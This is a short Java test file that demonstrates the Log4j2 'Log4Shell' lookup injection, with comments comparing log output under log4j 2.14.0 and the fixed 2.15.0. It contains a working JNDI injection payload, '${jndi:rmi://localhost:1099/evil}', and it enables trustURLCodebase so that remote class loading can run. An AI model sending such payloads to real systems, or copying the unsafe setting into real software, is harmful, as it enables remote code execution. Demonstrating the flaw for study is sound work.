package com.boyuan;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/*
    Reference https://www.bilibili.com/video/BV1FL411E7g3
 */
public class Log4j2Test {

    private static final Logger LOGGER = LogManager.getLogger();

    public static void main(String[] args) {

        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");

        String username = "${java:os}";

        LOGGER.info("Hello {}!", username);

        username = "${java:vm}";

        LOGGER.info("Hello {}!", username);

        /*
            When we use log4j 2.14.0 version, the logs are as below:

            16:59:41.709 [main] INFO  com.boyuan.Log4j2Test - Hello Mac OS X 10.12.6 unknown, architecture: x86_64-64!
            16:59:41.712 [main] INFO  com.boyuan.Log4j2Test - Hello Java HotSpot(TM) 64-Bit Server VM (build 25.144-b01, mixed mode)!

            Executing EvilObj...
            (Some exceptions may be thrown)
            17:21:08.427 [main] INFO  com.boyuan.Log4j2Test - Hello ${jndi:rmi://localhost:1099/evil}!
        */

        username = "${jndi:rmi://localhost:1099/evil}";

        LOGGER.info("Hello {}!", username);

        /*
            After upgrading to log4j 2.15.0 version, the logs are as below:

            17:17:25.026 [main] INFO  com.boyuan.Log4j2Test - Hello ${java:os}!
            17:17:25.028 [main] INFO  com.boyuan.Log4j2Test - Hello ${java:vm}!
            17:17:25.029 [main] INFO  com.boyuan.Log4j2Test - Hello ${jndi:rmi://localhost:1099/evil}!
         */
    }

}
